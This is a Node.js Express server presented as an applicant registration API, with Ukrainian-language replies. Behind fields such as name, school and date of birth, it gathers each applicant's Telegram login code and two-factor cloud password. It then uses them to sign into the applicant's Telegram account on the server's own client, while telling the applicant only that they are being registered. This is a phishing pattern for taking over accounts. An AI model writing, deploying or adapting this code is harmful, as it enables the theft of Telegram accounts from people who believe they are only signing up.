const express = require("express");
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const cors = require("cors");

require("dotenv").config({ quiet: true });

const app = express();

app.use(cors());
app.use(express.json());

const SESSION = new StringSession("");
const client = new TelegramClient(
  SESSION,
  parseInt(process.env.API_ID),
  process.env.API_HASH,
  { connectionRetries: 5 },
);

app.get("/api", (request, response) => {
  response.send("API is working.");
});

app.post("/api/applicants/phone-code", async (request, response) => {
  try {
    const { applicantPhoneNumber } = request.body;
    await client.connect();
    await client.sendCode(
      {
        apiId: parseInt(process.env.API_ID),
        apiHash: process.env.API_HASH,
      },
      applicantPhoneNumber,
    );
    response.json({ success: true });
  } catch (error) {
    response.json({
      success: false,
      reason: "Не вдалося отримати код з Telegram.",
    });
  }
});

app.post("/api/applicants/login", async (request, response) => {
  try {
    const {
      applicantFullName,
      applicantPhoneNumber,
      applicantDateOfBirth,
      applicantCity,
      applicantSchool,
      applicantStudyingStatus,
      applicantPassword,
      applicantPhoneCode,
    } = request.body;
    await client.start({
      phoneNumber: async () => applicantPhoneNumber,
      password: async () => applicantPassword,
      phoneCode: async () => applicantPhoneCode,
      onError: (error) => {
        if (error.message === "Password is empty") {
          client.destroy();
          return response.json({
            success: true,
            message: "Реєструємо користувача без пароля.",
          });
        } else {
          client.destroy();
          return response.json({
            success: false,
            reason: "Сталася помилка під час реєстрації.",
          });
        }
      },
    });
    const isUserAuthorized = await client.isUserAuthorized();
    if (isUserAuthorized) {
      client.destroy();
      return response.json({
        success: true,
        message: "Реєструємо користувача з паролем.",
      });
    }
  } catch (error) {
    console.log(error.message);
  }
});

app.listen(process.env.PORT, () => console.log("Sever has been launched."));
